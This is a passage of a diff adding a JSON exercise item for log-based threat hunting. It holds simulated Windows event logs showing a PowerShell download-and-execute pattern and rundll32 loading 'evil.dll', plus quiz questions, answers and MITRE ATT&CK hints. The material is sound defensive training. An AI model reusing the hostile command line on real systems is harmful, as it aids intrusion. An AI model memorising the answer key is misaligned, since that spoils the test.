+      "Timestamp: 2024-07-10 09:30:20 | Hostname: SALES-PC | EventID: 4104 | ScriptBlockText: Contains(Invoke-Expression) AND Contains(DownloadString)",
+      "Timestamp: 2024-07-10 09:30:25 | Hostname: SALES-PC | EventID: 4688 | Process: rundll32.exe | ParentProcess: powershell.exe | CommandLine: rundll32.exe C:\\Windows\\Temp\\evil.dll,EntryPoint"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What legitimate Microsoft build tool was abused by the macro?",
+        "answer": "msbuild.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What process, often associated with MSBuild, executed the final command line?",
+        "answer": "cvtres.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What was the likely initial execution vector?",
+        "answer": "Malicious Office Macro",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "User Execution: Malicious File",
+        "technique_id": "T1204.002",
+        "url": "https://attack.mitre.org/techniques/T1204/002/"
+      },
+      {
+        "tactic": "Defense Evasion (TA0005)",
+        "technique_name": "Signed Binary Proxy Execution: MSBuild",
+        "technique_id": "T1218.006",
+        "url": "https://attack.mitre.org/techniques/T1218/006/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "Command and Scripting Interpreter: PowerShell",
+        "technique_id": "T1059.001",
+        "url": "https://attack.mitre.org/techniques/T1059/001/"
+      }
+    ]
+  }
+]
